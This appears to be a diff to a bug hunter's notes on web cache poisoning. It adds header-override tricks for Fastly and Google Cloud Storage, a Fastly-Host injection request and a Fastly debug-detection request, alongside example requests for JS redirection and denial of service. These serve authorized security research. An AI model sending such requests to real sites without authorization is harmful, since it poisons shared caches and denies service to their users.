@@ -79,12 +79,14 @@ files that are static and do not depend on user input in any way.
     zTRANSFER-ENCODING: asdf.
     Content-Type: <invalid_value>
 
-    # X-Forwarded-Override: supported by GCP buckets
-    X-Forwarded-Override: HEAD if cached, returns an empty response
-    X-Forwarded-Override: PURGE, try if enabled.
+    # X-Method-Override: supported by GCP buckets
+    X-Method-Override: HEAD if cached, returns an empty response
+    X-Method-Override: PURGE, try if enabled.
 
 Find other targets using GCP buckets and test 
 Moral of the story, brute force cache poisoning headers 
+
+# x-forwarded-scheme on Rails Applications
 
     X-Forwarded-Scheme - Rack Middleware
     X-Forwarded-Scheme: http        results into a 301 redirect to the same location.
@@ -92,6 +94,7 @@ Moral of the story, brute force cache poisoning headers
 If the response is cached by a CDN, it would cause a redirect loop, denying access to the file
 
 # TESTING FOR CACHE POISONING
+
 # Using multiple headers to exploit web cache poisoning
     # Max bounty $3k Exploit
     GET /main/static.js HTTP/1.1
@@ -99,6 +102,16 @@ If the response is cached by a CDN, it would cause a redirect loop, denying acce
     X-Forwarded-Scheme: https
     X-Forwarded-Host: site_to_redirect_to.com
 [Cache Poisoning leads to JS files redirection](https://hackerone.com/reports/1795197)
+
+# x-http-method-override on Fastly and GCS
+[X-Http-Method-Override header behavior](https://www.fastly.com/documentation/guides/integrations/non-fastly-services/google-cloud-storage/#x-http-method-override-header-behavior)f
+> x-http-method-override: HEAD
+
+# Fastly-Host header injection
+
+    GET /?cb=1 HTTP/1.1
+    Host: anything-goes-here.com
+    Fastly-Host: legit-host.com
 
 # Top-Tier $9,700 Real World Exploit on PayPal
 [DoS on PayPal via web cache poisoning](https://hackerone.com/reports/622122)
@@ -150,6 +163,24 @@ for the microservices and distributed systems people.
 
 # Fastly Cache Poisoning with X-Forwarded-Host and Port Numbers 
 [Fastly Cache Poisoning Advisory](https://www.fastly.com/security-advisories/fastly-security-advisory-cache-poisoning-vulnerability-leveraging-x-forwarded-host-header)
+[On Fastly cache keys](https://www.fastly.com/blog/getting-most-out-vary-fastly)
+
+# Detecting Fastly 
+    GET / HTTP/1.1
+    Fastly-Debug: 1 
+
+    # HTTP/1.1 200 OK
+    surrogate-control: max-age=86400
+    surrogate-key: app_marketing-client-ssr
+    age: 268
+    fastly-debug-path: (D cache-lis1490042-LIS 1753135014) (F cache-lis1490053-LIS 1753134747)
+    fastly-debug-ttl: (H cache-lis1490042-LIS - - 268)
+    fastly-debug-digest: 122d2fa6e2b43b7835b40170f1519627da4e81565a25c347f9f7e4765204dcc9
+    x-cache: HIT
+    x-cache-hits: 1
+    x-timer: S1753135014.357746,VS0,VE8
+
+-
 
     # Attacker Request
     GET / HTTP/1.1
